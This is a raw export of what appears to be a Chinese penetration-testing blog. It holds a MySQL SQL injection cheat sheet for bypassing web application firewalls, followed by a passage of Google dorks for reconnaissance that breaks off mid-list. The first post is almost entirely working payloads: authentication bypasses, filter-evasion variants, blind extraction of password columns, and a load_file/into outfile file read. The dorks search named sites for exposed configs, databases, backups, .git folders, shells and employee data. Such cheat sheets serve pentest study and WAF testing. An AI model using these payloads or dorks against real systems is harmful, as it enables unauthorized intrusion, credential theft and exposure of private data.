plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.ptsecurity.com/download/PT-devteev-CC-WAF-ENG.pdf</span><br><span class=\"line\"></span><br><span class=\"line\">https://media.blackhat.com/bh-us-12/Briefings/Ristic/BH_US_12_Ristic_Protocol_Level_Slides.pdf</span><br><span class=\"line\"></span><br><span class=\"line\">http://www.blackhatlibrary.net/SQL_injection</span><br><span class=\"line\"></span><br><span class=\"line\">http://websec.ca/kb/sql_injection</span><br></pre></td></tr></table></figure>\n<p></style></p>\n","cover_type":"img","excerpt":"","more":"<h1 id=\"0x01-MYSQl灵活的语法\"><a href=\"#0x01-MYSQl灵活的语法\" class=\"headerlink\" title=\"0x01 MYSQl灵活的语法\"></a>0x01 MYSQl灵活的语法</h1><hr>\n<p><strong>1 MySQL语法以及认证绕过</strong></p>\n<p>注释符：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#， </span><br><span class=\"line\">-- X(X为任意字符)</span><br><span class=\"line\">/*(MySQL-5.1)</span><br><span class=\"line\">;%00</span><br><span class=\"line\">`</span><br><span class=\"line\">&#x27;or 1=1;%00</span><br><span class=\"line\">&#x27;or 1=1 union select 1,2`&#x27;</span><br><span class=\"line\">&#x27;or 1=1 #</span><br><span class=\"line\">&#x27;/*!50000or*/ 1=1 -- -      //版本号为5.1.38时只要小于50138</span><br><span class=\"line\">&#x27;/*!or*/ 1=1 -- -</span><br></pre></td></tr></table></figure>\n\n<p>前缀：</p>\n<p>任意混合 <code>+ - ~ !</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;or --+2=- -!!!&#x27;2</span><br></pre></td></tr></table></figure>\n\n<p>测试后发现<code>and/or</code>后面可以跟上偶数个<code>!、~</code>可以替代空格，也可以混合使用(混合后规律又不同)，and&#x2F;or前的空格可以省略</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;or- -!!!1=1；</span><br></pre></td></tr></table></figure>\n\n<p>运算符：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">^, =, !=, %, /, *, &amp;, &amp;&amp;, |, ||, &lt;, &gt;, &lt;&lt;, &gt;&gt;, &gt;=, &lt;=, &lt;&gt;, &lt;=&gt;, XOR,DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN,……</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;or 1 rlike &#x27;1</span><br></pre></td></tr></table></figure>\n\n<p>空格替换：<code>%20, %09, %0a, %0b, %0c, %0d, %a0</code></p>\n<p>也可以插入括号，前缀，操作符，引号</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;or+(1)sounds/**/like&quot;1&quot;--%a0-</span><br></pre></td></tr></table></figure>\n\n<p>字符串格式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27; or &quot;a&quot;=&#x27;a&#x27;</span><br><span class=\"line\">&#x27; or &#x27;a&#x27;=n&#x27;a&#x27;               //unicode</span><br><span class=\"line\">&#x27; or &#x27;a&#x27;=b&#x27;1100001&#x27;         //binary</span><br><span class=\"line\">&#x27; or &#x27;a&#x27;=_binary&#x27;1100001&#x27;   //5.5.41下测试无效</span><br><span class=\"line\">&#x27; or &#x27;a&#x27;=x&#x27;61&#x27;              //16进制</span><br></pre></td></tr></table></figure>\n\n<p><strong>2、MySQL常用的一些小工具</strong></p>\n<p>常量：<code>true， false， null， \\N, current_timestamp....</code></p>\n<p>变量：<code>@myvar:=1</code></p>\n<p>系统变量：<code>@@version, @@datadir....</code></p>\n<p>常用函数：<code>version(), pi(), pow(), char(), substring()....</code></p>\n<p><strong>3、MySQL类型转换</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27; or 1=true #true=1, false=0</span><br><span class=\"line\">&#x27; or 1 #true</span><br><span class=\"line\">&#x27; or version()=5.5 #5.5.41-log</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27; or round(pi(),1)+true+true+0.4=version() #3.1+1+1+0.4</span><br><span class=\"line\"></span><br><span class=\"line\">select * from users where &#x27;a&#x27;=&#x27;b&#x27;=&#x27;c&#x27;</span><br><span class=\"line\">select * from users where (&#x27;a&#x27;=&#x27;b&#x27;)=&#x27;c&#x27;</span><br><span class=\"line\">select * from users where (false)=&#x27;c&#x27;</span><br><span class=\"line\">select * from users where (0)=&#x27;c&#x27;</span><br><span class=\"line\">select * from users where (0)=0</span><br><span class=\"line\">select * from users where true</span><br><span class=\"line\">select * from users</span><br></pre></td></tr></table></figure>\n\n<p>以上的语句都是同样的效果</p>\n<p><strong>4、认证绕过</strong></p>\n<p>绕过语句：<code>&#39;=&#39;</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select data from users where name=&quot;=&quot;</span><br><span class=\"line\">select data from users where flase=&quot; </span><br><span class=\"line\">select data from users where 0=0</span><br></pre></td></tr></table></figure>\n\n<p>绕过语句：<code>&#39;-&#39;</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select data from users where name=&#x27;&#x27;-&#x27;&#x27;</span><br><span class=\"line\">select data from users where name=0-0</span><br><span class=\"line\">select data from users where 0=0</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"0x02-关键字过滤\"><a href=\"#0x02-关键字过滤\" class=\"headerlink\" title=\"0x02 关键字过滤\"></a>0x02 关键字过滤</h1><hr>\n<p>空格</p>\n<p>过滤代码<code>/\\s/</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%20, %09, %0a, %0b, %0c, %0d, %a0</span><br></pre></td></tr></table></figure>\n\n<p>关键字<code>OR，AND</code></p>\n<p>过滤代码<code>/\\sor\\s/i,/\\sand\\s/i</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;||1=&#x27;1     #or</span><br><span class=\"line\">&#x27;=&#x27;</span><br><span class=\"line\">&#x27;&amp;&amp;1=&#x27;1     #and</span><br></pre></td></tr></table></figure>\n\n<p>关键字<code>union select</code></p>\n<p>过滤代码<code>/union\\s+select/i</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;and(true)like(false)union(select(pass)from(users))#</span><br><span class=\"line\">&#x27;union [all|distinct] select pass from users#</span><br><span class=\"line\">&#x27;union%a0select pass from users#</span><br><span class=\"line\">&#x27;union/*!select*/pass from users#</span><br><span class=\"line\">/vuln.php?id=1 union/*&amp;sort=*/select pass from users-- -</span><br></pre></td></tr></table></figure>\n\n<p>如果单独过滤union,使用盲注来获取数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;and(select pass from users limit 1)=&#x27;secret</span><br></pre></td></tr></table></figure>\n\n<p>通过子查询获取单值来进行比较</p>\n<p>关键字<code>limit</code></p>\n<p>过滤代码<code>/limit/i</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;and(select pass from users where id=1)=&#x27;a</span><br><span class=\"line\">&#x27;and(select pass from users group by id having id=1)=&#x27;a</span><br><span class=\"line\">&#x27;and length((select pass from users having substr(pass,1,1)=&#x27;a&#x27;))</span><br></pre></td></tr></table></figure>\n\n<p>关键字<code>having</code></p>\n<p>过滤代码<code>/having/i</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;and(select substr(group_concat(pass),1,1)from users)=&#x27;a</span><br></pre></td></tr></table></figure>\n\n<p>关键字<code>select ... from</code></p>\n<p>过滤代码<code>/SELECT\\s+[A-Za-z.]+\\s+FROM/i/i</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select [all|distinct] pass from users</span><br><span class=\"line\">select`table_name`from`information_schema` . `tables`</span><br><span class=\"line\">select pass as alias from users</span><br><span class=\"line\">select pass aliasalias from users</span><br><span class=\"line\">select pass`alias alias`from users</span><br><span class=\"line\">select+pass%a0from(users)</span><br></pre></td></tr></table></figure>\n\n<p>关键字<code>select</code></p>\n<p>过滤代码<code>/select/i</code></p>\n<h3 id=\"1-有文件读取权限\"><a href=\"#1-有文件读取权限\" class=\"headerlink\" title=\"1 有文件读取权限\"></a>1 有文件读取权限</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27; and substr(load_file(&#x27;file&#x27;),locate(&#x27;DocumentRoot&#x27;,(load_file(&#x27;file&#x27;)))+</span><br><span class=\"line\">length(&#x27;DocumentRoot&#x27;),10)=&#x27;a&#x27;=&#x27;&#x27; into outfile &#x27;/var/www/dump.txt</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-获取列名\"><a href=\"#2-获取列名\" class=\"headerlink\" title=\"2 获取列名\"></a>2 获取列名</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27; and 列名 is not null#</span><br><span class=\"line\">&#x27; procedure analyse()#</span><br></pre></td></tr></table></figure>\n\n<p>使用substr来做过滤条件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;and substr(pass,1,1)=&#x27;a</span><br></pre></td></tr></table></figure>\n\n<p>关键字<code>select,and,&amp;</code></p>\n<p>‘0#</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select data from users where name = &#x27;&#x27;-0 # int typecast</span><br><span class=\"line\">select data from users where name = 0 # int typecast</span><br><span class=\"line\">select data from users where 0 = 0 # true</span><br></pre></td></tr></table></figure>\n\n<p>‘-1#</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select data from users where 0 = -1 # false</span><br></pre></td></tr></table></figure>\n\n<p>使用条件判断来进行<code>true、false</code>的选择</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ifnull(nullif()), case when， if()</span><br><span class=\"line\">&#x27;-if(name=&#x27;Admin&#x27;,1,0)#</span><br></pre></td></tr></table></figure>\n\n<p>使用嵌套条件<code>&#39;-if(</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(name=&#x27;Admin&#x27;,1,0), // condition</span><br><span class=\"line\">if(substr(pass,1,1)=&#x27;a&#x27;,1,0) // if true</span><br><span class=\"line\">,0)# // if false    </span><br></pre></td></tr></table></figure>\n\n<h1 id=\"0x03-函数过滤\"><a href=\"#0x03-函数过滤\" class=\"headerlink\" title=\"0x03 函数过滤\"></a>0x03 函数过滤</h1><hr>\n<p>构建字符串相关函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unhex char hex ascii ord substr substring mid pad left right insert</span><br><span class=\"line\">&#x27; and substr(data,1,1) = &#x27;a&#x27;#</span><br><span class=\"line\">&#x27; and substr(data,1,1) = 0x61# 0x6162</span><br><span class=\"line\">&#x27; and substr(data,1,1) = unhex(61)# unhex(6162)</span><br><span class=\"line\">&#x27; and substr(data,1,1) = char(97)# char(97,98)</span><br><span class=\"line\">&#x27; and hex(substr(data,1,1)) = 61#</span><br><span class=\"line\">&#x27; and ascii(substr(data,1,1)) = 97#</span><br><span class=\"line\">&#x27; and ord(substr(data,1,1)) = 97#</span><br></pre></td></tr></table></figure>\n\n<p>使用conv来进行进制的转换</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27; and substr(data,1,1) = lower(conv(10,10,36))# &#x27;a&#x27;</span><br><span class=\"line\">&#x27; and substr(data,1,1) = lower(conv(11,10,36))# &#x27;b&#x27;</span><br><span class=\"line\">&#x27; and substr(data,1,1) = lower(conv(36,10,36))# &#x27;z&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>使用函数来猜解数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27; and substr(data,1,1) = &#x27;a&#x27;#</span><br><span class=\"line\">&#x27; and substring(data,1,1) = &#x27;a&#x27;#</span><br><span class=\"line\">&#x27; and mid(data,1,1) = &#x27;a&#x27;#</span><br></pre></td></tr></table></figure>\n\n<p>不适用逗号来获取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27; and substr(data from 1 for 1) = &#x27;a&#x27;#</span><br></pre></td></tr></table></figure>\n\n<p>同样也可以使用一下比较少见的函数来尝试绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lpad(data,1,space(1)) // lpad(&#x27;hi&#x27;,4,&#x27;?&#x27;) = &#x27;??hi&#x27;</span><br><span class=\"line\">rpad(data,1,space(1)) // rpad(&#x27;hi&#x27;,4,&#x27;?&#x27;) = &#x27;hi??&#x27;</span><br><span class=\"line\">left(data,1)</span><br><span class=\"line\">reverse(right(reverse(data),1))</span><br><span class=\"line\">insert(insert(version(),1,0,space(0)),2,222,space(0))</span><br></pre></td></tr></table></figure>\n\n<p>有些函数有类似搜索匹配的功能</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;-if(locate(&#x27;f&#x27;,data),1,0)#</span><br><span class=\"line\">&#x27;-if(locate(&#x27;fo&#x27;,data),1,0)#</span><br><span class=\"line\">&#x27;-if(locate(&#x27;foo&#x27;,data),1,0)#</span><br><span class=\"line\">instr(), position()</span><br></pre></td></tr></table></figure>\n\n<p>使用函数进行字符串的切割</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">length(trim(leading &#x27;a&#x27; FROM data)) # length will be shorter</span><br><span class=\"line\">length(replace(data, &#x27;a&#x27;, &#x27;&#x27;)) # length will be shorter</span><br></pre></td></tr></table></figure>\n\n<p>2种方式都是相同效果</p>\n<h1 id=\"0x04-注入时主要使用的一些东西\"><a href=\"#0x04-注入时主要使用的一些东西\" class=\"headerlink\" title=\"0x04 注入时主要使用的一些东西\"></a>0x04 注入时主要使用的一些东西</h1><hr>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1个控制流程操作(select, case, if(), ...)</span><br><span class=\"line\">1个比较操作(=, like, mod(), ...)</span><br><span class=\"line\">1个字符串的猜解(mid(), left(), rpad(), …)</span><br><span class=\"line\">1个字符串生成(0x61, hex(), conv())</span><br></pre></td></tr></table></figure>\n\n<p>使用<code>conv([10-36],10,36)</code>可以实现所有字符的表示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">false !pi()           0     ceil(pi()*pi())           10 A      ceil((pi()+pi())*pi()) 20       K</span><br><span class=\"line\">true !!pi()           1     ceil(pi()*pi())+true      11 B      ceil(ceil(pi())*version()) 21   L</span><br><span class=\"line\">true+true             2     ceil(pi()+pi()+version()) 12 C      ceil(pi()*ceil(pi()+pi())) 22   M</span><br><span class=\"line\">floor(pi())           3     floor(pi()*pi()+pi())     13 D      ceil((pi()+ceil(pi()))*pi()) 23 N</span><br><span class=\"line\">ceil(pi())            4     ceil(pi()*pi()+pi())      14 E      ceil(pi())*ceil(version()) 24   O</span><br><span class=\"line\">floor(version())      5     ceil(pi()*pi()+version()) 15 F      floor(pi()*(version()+pi())) 25 P</span><br><span class=\"line\">ceil(version())       6     floor(pi()*version())     16 G      floor(version()*version()) 26   Q</span><br><span class=\"line\">ceil(pi()+pi())       7     ceil(pi()*version())      17 H      ceil(version()*version()) 27    R</span><br><span class=\"line\">floor(version()+pi()) 8     ceil(pi()*version())+true 18 I      ceil(pi()*pi()*pi()-pi()) 28    S</span><br><span class=\"line\">floor(pi()*pi())      9     floor((pi()+pi())*pi())   19 J      floor(pi()*pi()*floor(pi())) 29 T</span><br></pre></td></tr></table></figure>\n\n<p>更多详细的东西可以参考原文去了解，还有一些其他的注入资料可以参考</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.ptsecurity.com/download/PT-devteev-CC-WAF-ENG.pdf</span><br><span class=\"line\"></span><br><span class=\"line\">https://media.blackhat.com/bh-us-12/Briefings/Ristic/BH_US_12_Ristic_Protocol_Level_Slides.pdf</span><br><span class=\"line\"></span><br><span class=\"line\">http://www.blackhatlibrary.net/SQL_injection</span><br><span class=\"line\"></span><br><span class=\"line\">http://websec.ca/kb/sql_injection</span><br></pre></td></tr></table></figure>\n<p></style></p>\n"},{"title":"信息收集-敏感信息收集","cover":"https://img1.baidu.com/it/u=132799049,2544133620&fm=253&fmt=auto&app=120&f=JPEG?w=1422&h=800","swiper_index":10,"top_group_index":10,"background":"#fff","date":"2025-03-20T02:14:19.000Z","updated":"2025-03-20T15:17:26.644Z","keywords":null,"description":null,"top":null,"top_img":null,"comments":1,"toc":null,"toc_number":null,"toc_style_simple":null,"copyright":null,"copyright_author":"转载","copyright_author_href":null,"copyright_url":null,"copyright_info":null,"mathjax":null,"katex":null,"aplayer":null,"highlight_shrink":null,"aside":null,"ai":null,"_content":"# 信息收集-敏感信息收集\n\n## Google\n\n- Google Hacking Database：https://www.exploit-db.com/google-hacking-database\n- Google Hacking：https://pentest-tools.com/information-gathering/google-hacking\n- Google Dork：https://cxsecurity.com/dorks/\n\n### 基础语法\n\n#### 管理后台地址\n\n```\nsite:target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system\nsite:target.com inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backend\nsite:target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录\n```\n\n#### 上传类漏洞地址\n\n```\nsite:target.com inurl:file\nsite:target.com inurl:upload\n```\n\n#### 注入页面\n\n```\nsite:target.com inurl:?id=\nsite:target.com inurl:php?id=\n```\n\n#### 编辑器页面\n\n```\nsite:target.com inurl:ewebeditor\n```\n\n#### 目录遍历漏洞\n\n```\nsite:target.com intitle: \"index of\"\n```\n\n#### URL 跳转\n\n```\nsite:target.com inurl:url= | inurl:return= | inurl:next= | inurl:redir= inurl:http\n```\n\n#### SQL错误\n\n```\nsite:target.com intext:\"sql syntax near\" | intext:\"syntax error has occurred\" | intext:\"incorrect syntax near\" | intext:\"unexpected end of SQL command\" | intext:\"Warning: mysql_connect()\" | intext:”Warning: mysql_query()\" | intext:\"Warning: pg_connect()\"\n```\n\n#### phpinfo\n\n```\nsite:target.com ext:php intitle:phpinfo \"published by the PHP Group\"\n```\n\n#### 配置文件泄露\n\n```\nsite:target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini\n```\n\n#### 数据库文件泄露\n\n```\nsite:target.com ext:.sql | .dbf | .mdb | .db\n```\n\n#### 日志文件泄露\n\n```\nsite:target.com ext:.log\n```\n\n#### 备份和历史文件泄露\n\n```\nsite:target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar\n```\n\n#### 公开文件泄露\n\n```\nsite:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv\n```\n\n#### 邮箱信息\n\n```\nsite:target.com intext:@target.com\nsite:target.com 邮件\nsite:target.com email\n```\n\n#### 社工信息\n\n```\nsite:target.com intitle:账号 | 密码 | 工号 | 学号 | 身份证\n```\n\n### Dorks\n\n```shell\n# Code share sites\nsite:http://ideone.com | site:http://codebeautify.org | site:http://codeshare.io | site:http://codepen.io | site:http://repl.it | site:http://jsfiddle.net \"company\"\n\n# GitLab/GitHub/Bitbucket\nsite:github.com | site:gitlab.com | site:bitbucket.org \"company\"\n\n# Stackoverflow\nsite:stackoverflow.com \"target.com\"\n\n# Project management sites\nsite:http://trello.com | site:*.atlassian.net \"company\"\n\n# Pastebin-like sites\nsite:http://justpaste.it | site:http://pastebin.com \"company\"\n\n# Config files\nsite:target.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:env | ext:ini\n\n# Database files\nsite:target.com ext:sql | ext:dbf | ext:mdb\n\n# Backup files\nsite:target.com ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup\n\n# .git folder\ninurl:\"/.git\" target.com -github\n\n# Exposed documents\nsite:target.com ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv\n\n# Other files\nsite:target.com intitle:index.of | ext:log | ext:php intitle:phpinfo \"published by the PHP Group\" | inurl:shell | inurl:backdoor | inurl:wso | inurl:cmd | shadow | passwd | boot.ini | inurl:backdoor | inurl:readme | inurl:license | inurl:install | inurl:setup | inurl:config | inurl:\"/phpinfo.php\" | inurl:\".htaccess\" | ext:swf\n\n# SQL errors\nsite:target.com intext:\"sql syntax near\" | intext:\"syntax error has occurred\" | intext:\"incorrect syntax near\" | intext:\"unexpected end of SQL command\" | intext:\"Warning: mysql_connect()\" | intext:\"Warning: mysql_query()\" | intext:\"Warning: pg_connect()\"\n\n# PHP errors\nsite:target.com \"PHP Parse error\" | \"PHP Warning\" | \"PHP Error\"\n\n# Login pages\nsite:target.com inurl:signup | inurl:register | intitle:Signup\n\n# Open redirects\nsite:target.com inurl:redir | inurl:url | inurl:redirect | inurl:return | inurl:src=http | inurl:r=http\n\n# Apache Struts RCE\nsite:target.com ext:action | ext:struts | ext:do\n\n# Search in pastebin\nsite:pastebin.com target.com\n\n# Linkedin employees\nsite:linkedin.com employees target.com\n\n# Wordpress files\nsite:target.com inurl:wp-content | inurl:wp-includes\n\n# Subdomains\nsite:*.target.com\n\n# Sub-subdomains\nsite:*.*.target.com\n\n#Find S3 Buckets\nsite:.s3.amazonaws.com | site:http://storage.googleapis.com | site:http://amazonaws.com \"target\"\n\n# Traefik\nintitle:traefik inurl:8080/dashboard \"target\"\n\n# Jenkins\nintitle:\"Dashboard [Jenkins]\"\n\n# Other 3rd parties sites\nhttps://www.google.com/search?q=site%3Agitter.im%20%7C%20site%3Apapaly.com%20%7C%20site%3Aproductforums.google.com%20%7C%20site%3Acoggle.it%20%7C%20site%3Areplt.it%20%7C%20site%3Aycombinator.com%20%7C%20site%3Alibraries.io%20%7C%20site%3Anpm.runkit.com%20%7C%20site%3Anpmjs.com%20%7C%20site%3Ascribd.com%20%22united%22\n\n# Backup files\nhttps://www.google.com/search?q=site%3Aunited.com%20ext%3Abkf%20%7C%20ext%3Abkp%20%7C%20ext%3Abak%20%7C%20ext%3Aold%20%7C%20ext%3Abackup\n\n# Login pages\nhttps://www.google.com/search?q=site%3Aunited.com%20inurl%3Asignup%20%7C%20inurl%3Aregister%20%7C%20intitle%3ASignup\n\n# Config files\nhttps://www.google.com/search?q=site%3Aunited.com%20ext%3Axml%20%7C%20ext%3Aconf%20%7C%20ext%3Acnf%20%7C%20ext%3Areg%20%7C%20ext%3Ainf%20%7C%20ext%3Ardp%20%7C%20ext%3Acfg%20%7C%20ext%3Atxt%20%7C%20ext%3Aora%20%7C%20ext%3Aenv%20%7C%20ext%3Aini\n\n# .git folder\nhttps://www.google.com/search?q=inurl%3A%5C%22%2F.git%5C%22%20united.com%20-github\n\n# Database files\nhttps://www.google.com/search?q=site%3Aunited.com%20ext%3Asql%20%7C%20ext%3Adbf%20%7C%20ext%3Amdb\n\n# Open redirects\nhttps://www.google.com/search?q=site%3Aunited.com%20inurl%3Aredir%20%7C%20inurl%3Aurl%20%7C%20inurl%3Aredirect%20%7C%20inurl%3Areturn%20%7C%20inurl%3Asrc%3Dhttp%20%7C%20inurl%3Ar%3Dhttp\n\n# Code share sites\nhttps://www.google.com/search?q=site%3Asharecode.io%20%7C%20site%3Acontrolc.com%20%7C%20site%3Acodepad.co%20%7Csite%3Aideone.com%20%7C%20site%3Acodebeautify.org%20%7C%20site%3Ajsdelivr.com%20%7C%20site%3Acodeshare.io%20%7C%20site%3Acodepen.io%20%7C%20site%3Arepl.it%20%7C%20site%3Ajsfiddle.net%20%22united%22\n\n# Pastebin-like sites\nhttps://www.google.com/search?q=site%3Ajustpaste.it%20%7C%20site%3Aheypasteit.com%20%7C%20site%3Apastebin.com%20%22united%22\n\n# Linkedin employees\nhttps://www.google.com/search?q=site%3Alinkedin.com%20employees%20united.com\n\n#Project management sites\nhttps://www.google.com/search?q=site%3Atrello.com%20%7C%20site%3A*.atlassian.net%20%22united%22\n\n# Other 